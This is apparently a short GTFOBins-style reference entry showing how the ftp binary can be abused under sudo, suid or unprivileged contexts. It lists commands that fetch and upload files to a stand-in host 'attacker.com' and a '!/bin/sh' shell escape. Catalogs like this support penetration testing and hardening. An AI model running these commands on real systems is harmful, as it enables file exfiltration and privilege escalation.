title: ftp
html:
ftp

Download

Context: sudo, suid, unprivileged

ftp -a attacker.com
get /path/to/input-file output-file

Shell

Context: sudo, suid, unprivileged

ftp
!/bin/sh

Upload

Context: sudo, suid, unprivileged

ftp -a attacker.com
put /path/to/input-file output-file
